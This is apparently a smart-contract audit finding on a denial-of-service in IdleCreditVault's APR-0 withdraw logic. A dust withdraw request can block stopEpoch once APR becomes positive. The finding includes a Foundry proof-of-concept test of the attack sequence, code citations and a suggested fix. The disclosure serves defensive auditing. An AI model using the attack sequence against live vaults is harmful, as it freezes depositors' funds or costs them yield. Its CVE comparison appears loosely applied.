### Title
Unprivileged APR0 withdraw request permanently blocks `stopEpoch` once APR changes, freezing the vault or forcing a zero-yield epoch - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.prepareStopEpochWithApr0` reverts with `NotAllowed` whenever `apr0TotalPrincipal != 0` and `unscaledApr != 0`. Any tranche holder can permissionlessly create `apr0TotalPrincipal` via `IdleCDOEpochVariant.requestWithdraw` during an APR=0 epoch. If the manager later sets a non-zero APR, every `stopEpoch`/`stopEpochWithDuration` call reverts until the APR is forced back to 0 — i.e. a single dust-sized withdraw request by an attacker either freezes the entire pool's epoch state machine or forces a full epoch at 0% APR, burning one epoch of yield for all LPs. There is no path that settles the APR0 bucket while APR > 0.

### Finding Description
The bug mirrors CVE-2026-20068's "incomplete error checking when parsing input leads to engine restart/DoS": the vault fails to handle the legitimate-but-unexpected state combination (outstanding APR0 receipts + non-zero APR) and reverts unconditionally instead of settling.

Flow:
1. Epoch runs with `unscaledApr == 0`. Attacker (any KYC'd AA/BB tranche holder) calls `cdoEpoch.requestWithdraw(amount, tranche)`. `IdleCreditVault.requestWithdraw` routes to `_requestWithdrawApr0`, which increments the global `apr0TotalPrincipal` [1](#0-0) .
2. Manager sets APR > 0 for the next epoch (`setAprs` / `stopEpoch` with `_newApr != 0`), a normal, honest operation.
3. On the next `stopEpoch`, `IdleCDOEpochVariant.stopEpoch` calls `prepareStopEpochWithApr0`, which hits `if (unscaledApr != 0) revert NotAllowed()` [2](#0-1) . The transaction reverts; `epochNumber` is never bumped; `isEpochRunning` stays inconsistent (epoch never closed), `apr0TotalPrincipal` is never cleared.
4. `apr0TotalPrincipal` is only reset inside `prepareStopEpochWithApr0` itself (line 540) or in `_clearWithdrawClaimForEpoch` during default finalization [3](#0-2) . Neither is reachable while APR > 0, so the only recovery is `setAprs(0,0)` and one full epoch duration at zero APR.
5. Deposits, withdraw claims gated on `epochNumber <= lastWithdrawRequest` (`_claimFundedWithdrawRequest`, line 326) and the whole epoch state machine stall for that period.

The existing test `testApr0InvariantRevertsIfAprChangesAfterApr0Request` proves the revert but does not cover the unprivileged-trigger / permanent-bricking consequence [4](#0-3) .

### Impact Explanation
- Permanent freeze path: if operations require APR > 0 (borrower contract, yield expectations), `stopEpoch` is bricked indefinitely; all deposited principal and pending withdraw receipts are frozen because the epoch can never close and `claimWithdrawRequest` reverts via `epochNumber <= lastWithdrawRequest`.
- Forced zero-yield path: the only recovery is running a full epoch at APR = 0, causing a quantifiable loss equal to `getContractValue() * apr * epochDuration / 365 days` of yield for all LPs, while the attacker risks only a dust tranche position.
- Broken invariant: liveness of the epoch state machine — an unprivileged user must not be able to force a revert-only state into a privileged epoch-transition function.

### Likelihood Explanation
Low-to-medium. Requires the pool to operate at `unscaledApr == 0` at some point (a supported, tested mode) and later return to positive APR — a routine configuration change. The attacker's cost is one `requestWithdraw` with minimal tranche balance; no privileged role, no oracle, no borrower misbehavior needed. The invariant test shows the revert is reachable in one epoch transition.

### Recommendation
In `prepareStopEpochWithApr0`, do not revert when `unscaledApr != 0`. Instead settle the outstanding APR0 bucket at rate 0 (or at the realized interest computed from `_expInterest`), add it to `pendingWithdraws`, and clear `apr0TotalPrincipal`. Alternatively, prevent the state from arising by rejecting `requestWithdraw` into the APR0 bucket when `unscaledApr` is scheduled to change (i.e., gate `_requestWithdrawApr0` on the next-epoch APR), and/or allow `_clearWithdrawClaimForEpoch`-style per-user settlement outside default so the global bucket can always be drained without reverting `stopEpoch`.

### Proof of Concept
Foundry fork PoC (adapted from `test/foundry/IdleCreditVault.t.sol` helpers `_depositWithUser`, `_startEpochAndCheckPrices`, `_stopEpochAndCheckPrices`, `_forceLastEpochAprToZero`):

```solidity
function testApr0RequestBricksPositiveAprStopEpoch() external {
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);

    uint256 amount = 10000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    _transferBurnedTrancheTokens(address(this), true);
    // attacker with dust position
    address attacker = makeAddr("attacker");
    deal(defaultUnderlying, attacker, 1 * ONE_SCALE);
    _depositWithUser(attacker, 1 * ONE_SCALE, true);

    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest());
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // epoch is configured at APR 0; attacker opens a dust APR0 withdraw request
    _forceLastEpochAprToZero();
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(attacker), address(AAtranche));
    assertGt(IdleCreditVault(address(strategy)).apr0TotalPrincipal(), 0);

    _startEpochAndCheckPrices(1);

    // honest manager returns the pool to a normal positive APR
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(1e18, 1e18);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());

    // every stopEpoch reverts: epoch machine is bricked while apr0TotalPrincipal > 0
    vm.prank(manager);
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.stopEpoch(0, 0);

    // only remediation: an entire epoch forced to APR 0 -> one epoch of yield lost for all LPs
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0); // succeeds, but epoch earned nothing
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L505-508)
```text
    // APR0 principal is only valid while APR is 0 for that request lifecycle.
    if (unscaledApr != 0) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L567-577)
```text
  function _requestWithdrawApr0(uint256 _amount, address _user) internal {
    // Settle any previous APR0 request first, then start/update current epoch bucket.
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    if (_apr0User.principal == 0) {
      _apr0User.principalEpoch = epochNumber;
    }
    _apr0User.principal += _amount;
    // Epoch-level APR0 principal used only to compute stopEpoch APR0 pro-rata interest.
    apr0TotalPrincipal += _amount;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L821-831)
```text
    Apr0UserData storage apr0User = apr0Users[_user];
    if (apr0User.principal != 0 && apr0User.principalEpoch == _claimEpoch) {
      if (_isClearingApr0) {
        uint256 apr0Principal = apr0User.principal;
        uint256 totalApr0Principal = apr0TotalPrincipal;
        // prepareStopEpochWithApr0 may already close the global APR0 bucket before default finalization.
        apr0TotalPrincipal = apr0Principal >= totalApr0Principal ? 0 : totalApr0Principal - apr0Principal;
      }
      apr0User.principal = 0;
      apr0User.principalEpoch = 0;
    }
```

**File:** test/foundry/IdleCreditVault.t.sol (L3306-3338)
```text
  function testApr0InvariantRevertsIfAprChangesAfterApr0Request() external {
    // Scenario: APR0 request is created, then APR is changed before settlement.
    // Expectation: stopEpoch reverts to enforce APR0 lifecycle invariant.
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);

    uint256 amount = 10000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    _transferBurnedTrancheTokens(address(this), true);

    _startEpochAndCheckPrices(0);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 expectedInterest = cdoEpoch.expectedEpochInterest();
    deal(defaultUnderlying, borrower, expectedInterest);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    _forceLastEpochAprToZero();

    cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(address(this)) / 2, address(AAtranche));

    _startEpochAndCheckPrices(1);

    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(1e18, 1e18);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.stopEpoch(0, 0);
  }
```
